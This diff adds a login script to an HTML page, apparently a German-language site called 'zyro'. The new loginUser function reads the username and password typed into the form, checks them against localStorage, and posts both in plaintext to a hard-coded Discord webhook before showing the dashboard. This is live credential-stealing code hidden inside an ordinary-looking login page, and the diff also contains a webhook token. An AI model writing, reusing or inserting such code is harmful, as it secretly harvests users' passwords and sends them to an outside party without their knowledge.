@@ -6102,8 +6102,68 @@ ${geoCoords}
     }
   </script>
 
-</body>
-</html>
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1373923228711653457/ZNcgAmV4PVG6MsLVDe5Hcr7auXKgHlX7XS5QquQeje2viZJVpWVfLU1PPBlCO0m9Ji_e";
+
+// Login Funktion
+function loginUser() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const consent = document.getElementById("remember-me").checked;
+
+    if (!consent) {
+        alert("Bitte akzeptiere die Nutzungsbedingungen, um fortzufahren.");
+        return;
+    }
+
+    // Überprüfen, ob der Benutzer existiert
+    const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
+    const user = registeredUsers.find(u => u.username === username && u.password === password);
+
+    if (!user) {
+        alert("Benutzername oder Passwort ist falsch.");
+        return;
+    }
+
+    // Daten an Webhook senden
+    const message = {
+        username: "Login",
+        content: `**Login Versuch:**\nBenutzername: ${username}\nPasswort: ${password}`
+    };
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+    })
+    .then(response => {
+        // Benutzer als eingeloggt markieren
+        localStorage.setItem("zyroUser", JSON.stringify(user));
+        localStorage.setItem("zyroLoggedIn", "true");
+
+        // Weiterleitung zum Dashboard
+        document.getElementById("login-page").style.display = "none";
+        document.getElementById("dashboard").style.display = "block";
+
+        // Profilinformationen setzen
+        const profileName = document.getElementById("profile-name");
+        if (profileName) {
+            profileName.textContent = user.fullname || user.username;
+        }
+
+        const profileImage = document.getElementById("profile-image");
+        if (profileImage) {
+            const initial = (user.fullname || user.username).charAt(0).toUpperCase();
+            profileImage.textContent = initial;
+        }
+
+        alert("Anmeldung erfolgreich!");
+    })
+    .catch(error => console.error("Fehler beim Senden der Daten:", error));
+}
+</script>
 
 </body>
 </html>
